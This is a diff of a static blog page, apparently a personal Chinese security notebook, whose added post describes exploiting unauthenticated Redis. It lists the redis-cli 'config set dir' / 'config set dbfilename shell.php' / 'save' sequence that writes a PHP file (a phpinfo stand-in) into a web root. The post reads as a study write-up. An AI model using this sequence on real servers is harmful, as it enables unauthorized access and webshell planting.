@@ -6,18 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | 风筝</title>
+  <title>redis 未授权访问漏洞 getshell | 风筝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="风筝">
-<meta property="og:type" content="website">
-<meta property="og:title" content="风筝">
-<meta property="og:url" content="http://yoursite.com/archives/page/3/index.html">
+  <meta name="description" content="redis 未授权访问漏洞 getshell这里记录一下redis未授权访问漏洞的getshell，方便日后回顾 redis是一个key-value型数据库，信息以键对应值的关系存储在内存中。6379是redis的默认端口。 漏洞复现下载redis，修改redis配置文件redis.conf中的几个地方 12bind 127.0.0.1前面需要加上注释符，保证远程ip可以访问redis数据库,也可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redis 未授权访问漏洞 getshell">
+<meta property="og:url" content="http://yoursite.com/2019/11/11/redis/index.html">
 <meta property="og:site_name" content="风筝">
-<meta property="og:description" content="风筝">
+<meta property="og:description" content="redis 未授权访问漏洞 getshell这里记录一下redis未授权访问漏洞的getshell，方便日后回顾 redis是一个key-value型数据库，信息以键对应值的关系存储在内存中。6379是redis的默认端口。 漏洞复现下载redis，修改redis配置文件redis.conf中的几个地方 12bind 127.0.0.1前面需要加上注释符，保证远程ip可以访问redis数据库,也可">
 <meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-04-23T02:53:52.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="风筝">
-<meta name="twitter:description" content="风筝">
+<meta name="twitter:title" content="redis 未授权访问漏洞 getshell">
+<meta name="twitter:description" content="redis 未授权访问漏洞 getshell这里记录一下redis未授权访问漏洞的getshell，方便日后回顾 redis是一个key-value型数据库，信息以键对应值的关系存储在内存中。6379是redis的默认端口。 漏洞复现下载redis，修改redis配置文件redis.conf中的几个地方 12bind 127.0.0.1前面需要加上注释符，保证远程ip可以访问redis数据库,也可">
   
     <link rel="alternative" href="/atom.xml" title="风筝" type="application/atom+xml">
   
@@ -153,268 +154,178 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-redis" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/sql-hack1/" class="archive-article-date">
-  	<time datetime="2019-11-11T04:40:26.711Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/sql-hack1/">记一次过waf注入</a>
+    <h1 class="article-title" itemprop="name">
+      redis 未授权访问漏洞 getshell
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/redis/" class="archive-article-date">
+        
+        <a href="/2019/11/11/redis/" class="archive-article-date">
   	<time datetime="2019-11-11T04:40:26.702Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/redis/">redis 未授权访问漏洞 getshell</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="redis-未授权访问漏洞-getshell"><a href="#redis-未授权访问漏洞-getshell" class="headerlink" title="redis 未授权访问漏洞 getshell"></a>redis 未授权访问漏洞 getshell</h2><p>这里记录一下redis未授权访问漏洞的getshell，方便日后回顾</p>
+<p>redis是一个key-value型数据库，信息以键对应值的关系存储在内存中。6379是redis的默认端口。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>下载redis，修改redis配置文件redis.conf中的几个地方</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1前面需要加上注释符，保证远程ip可以访问redis数据库,也可以改成 bind 0.0.0.0</span><br><span class="line">2.protected-mode要修改为no，否则远程连接数据库的ip执行不了数据库语句</span><br></pre></td></tr></table></figure>
+<p>启动redis服务器(当前redis的文件夹)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server redis.conf</span><br></pre></td></tr></table></figure></p>
+<p>攻击者:(可以自己虚拟机搭建)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h xxx目标ip -p 6379</span><br></pre></td></tr></table></figure></p>
+<p>或者不用redis，可用telnet等连接命令</p>
+<p>redis配置的几个关键：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dir 指定的是redis的“工作路径”，之后生成的RDB和AOF文件都会存储在这里。</span><br><span class="line">dbfilename RDB文件名，默认为“dump.rdb”</span><br><span class="line">appendonly 是否开启AOF</span><br><span class="line">appendfilename AOF文件名，默认为“appendonly.aof”</span><br><span class="line">appendfsync AOF备份方式：always、everysec、no</span><br></pre></td></tr></table></figure>
+<h3 id="利用redis未授权访问写webshell"><a href="#利用redis未授权访问写webshell" class="headerlink" title="利用redis未授权访问写webshell"></a>利用redis未授权访问写webshell</h3><p>条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）redis服务器上有web服务器</span><br><span class="line">（2）web根目录已知</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html/   //目标的网站根目录</span><br><span class="line">config set dbfilename shell.php     //修改备份RDB文件名为shell.php</span><br><span class="line">set aaa &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p>任意set一个变量aaa的值为”&lt;?php phpinfo(); ?&gt;”,即可对目标服务器getshell</p>
+<p>参考链接：<br>离别歌 <a href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html</a></p>
+<p>知乎<br><a href="https://zhuanlan.zhihu.com/p/36529010" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/36529010</a> </p>
+<p>csdn<br><a href="https://blog.csdn.net/u011721501/article/details/45157399" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/45157399</a></p>
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/11/11/redis/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/maccms8x/" class="archive-article-date">
-  	<time datetime="2019-11-11T04:40:26.687Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2019/11/11/sql-hack1/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          记一次过waf注入
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/11/11/maccms8x/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Maccms8.x命令执行漏洞</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/maccms8x/">Maccms8.x命令执行漏洞</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/lun web/" class="archive-article-date">
-  	<time datetime="2019-11-11T04:40:26.652Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/lun web/">CTF - 论剑场</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/xuliehua/" class="archive-article-date">
-  	<time datetime="2019-11-11T04:40:26.591Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/xuliehua/">PHP反序列化由浅入深</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/ctf夺旗赛/" class="archive-article-date">
-  	<time datetime="2019-11-11T04:40:26.562Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/ctf夺旗赛/">CTF夺旗赛</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/google hack/" class="archive-article-date">
-  	<time datetime="2019-11-11T04:40:26.556Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/google hack/">Google Hack 语法</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/dedecms5.7/" class="archive-article-date">
-  	<time datetime="2019-11-11T04:40:26.552Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/dedecms5.7/">dedecms最新版后台三处getshell</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/11/11/风筝writewp/" class="archive-article-date">
-  	<time datetime="2019-11-11T04:40:26.531Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/11/11/风筝writewp/">2019上海嘉韦思杯线上赛writeup</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/page/2/">&laquo; Prev</a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><span class="page-number current">3</span>
-    </nav>
   
 
 
@@ -438,8 +349,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
